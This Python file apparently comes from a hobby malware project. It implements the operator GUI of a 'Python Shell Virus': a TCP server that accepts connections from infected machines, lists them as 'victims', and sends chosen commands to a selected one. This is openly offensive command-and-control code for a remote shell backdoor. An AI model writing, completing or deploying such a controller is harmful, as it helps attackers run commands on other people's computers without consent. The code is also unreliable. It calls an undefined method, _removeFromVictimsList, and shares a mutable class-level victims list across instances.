import socket
import threading
import tkinter as tk
from tkinter.messagebox import showerror, showinfo

from pythonHost.classes.victim import Victim


class HostWithGUI:

    victimsList = []

    def __init__(self, IP, PORT, opertaionListItems, startButtonCallAble, victimsList=[]):
        """
        param 1: the ip of the host
        param 2: the port of the host
        param 3: list of the avaliable commands
        param 4: function which has to be called when the start button is clicked
        param 5: initial victims list

        param 1 type: str
        param 2 type: int
        param 3 type: list
        param 4 type: function
        param 5 type: list
        """
        
        self.IP = IP
        self.PORT = PORT
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # The GUI Template
        self.window = tk.Tk()
        self.window.title("Python Shell Virus")

        self.victimsListBox = victimsList
        self.startButtonCallAble = startButtonCallAble

        # for scrolling vertically
        yscrollbar = tk.Scrollbar(self.window)
        yscrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Headers Labels
        tk.Label(text="Welcome To The Python Virus Shell!").pack()
        tk.Label(text="What Would You Like To Do?").pack()

        # Opertaion list
        variable = tk.StringVar(self.window)
        variable.set(opertaionListItems[0])  # default value
        opertaionList = tk.OptionMenu(
            self.window, variable, *opertaionListItems)

        opertaionList.pack()

        # Victims list
        self.victimsListBox = tk.Listbox(self.window, selectmode="single",
                                         yscrollcommand=yscrollbar.set)
        # Widget expands horizontally and
        # vertically by assigning both to
        # fill option
        self.victimsListBox.pack(padx=10, pady=10,
                                 expand=tk.YES, fill="both")
        x = list(self.victimsList)

        for each_item in range(len(x)):
            self.victimsListBox.insert(tk.END, x[each_item].getAddr())
            self.victimsListBox.itemconfig(each_item, bg="lime")

        # Attach listbox to vertical scrollbar
        yscrollbar.config(command=self.victimsListBox.yview)

        # Start Button
        startBtn = tk.Button(
            text="Start!",
            command=lambda:  threading.Thread(target=self.startButtonOnClick, args=(
                variable.get(), self.victimsListBox.get(tk.ACTIVE))).start()

        )
        startBtn.pack()

    def startButtonOnClick(self, selectedOption, selectedVictimAddr):
        """
        Called when the start button is clicked
        
        param 1: the selected option (command to execute)
        param 2: the socket address (IP, PORT) of the victim which the command has to be executed on
        
        param 1 type: str
        param 2 type: socket.socket
        """

        # Gets the selected victim object from the victims list
        selectedVictim = None
        for i in self.victimsList:
            if i.getAddr() == selectedVictimAddr:
                selectedVictim = i
                break
        
        if selectedVictim == None:
            self.showError("Error", "Please choose a victim!")
        else:
            try:
                self.startButtonCallAble(selectedOption, selectedVictim)
            except socket.error:
                self._removeFromVictimsList(selectedVictim.getAddr())
                self.victimsList.remove(selectedVictim)


    def startServer(self):
        """
        Starts the server
        """
        
        self.socket.bind((self.IP, self.PORT))
        self.socket.listen()

        while True:
            clientSoc, clientAddr = self.socket.accept()
            print(f"{clientAddr} has been connected!")

            victim = Victim(clientSoc)
            self.addVictim(victim)
            
    def addVictim(self, victim):
        """
        Adds new victim to the program (for example when new victim is connected)
        
        param 1: the victim object
        param 1 type: Victim
        """

        # Adds the new victim to the victims list
        self.victimsList.append(victim)
        # Add the new victim to the victims listbox
        self.victimsListBox.insert(tk.END, victim.getAddr())

    def removeVictim(self, victim):
        """
        Removes a victim from the program (for example when victim is disconnected)
        
        param 1: the victim object
        param 1 type: Victim
        """

        # Removes the victim from the victims list
        self.victimsList.remove(victim)
        # Removes the victim from the victims listbox
        idx = self.victimsListBox.get(0, tk.END).index(victim.getAddr())
        self.victimsListBox.delete(idx)


    def buildGUI(self):
        """
        Builds the GUI
        """
        self.window.mainloop()


    def showError(self, title, desc):
        """
        Shows error dialog

        param 1: the title of the dialog
        param 2: the description of the dialog
        
        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror(title, desc)

    def showInfo(self, title, desc):
        """
        Shows info dialog

        param 1: the title of the dialog
        param 2: the description of the dialog
        
        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showinfo(title, desc)
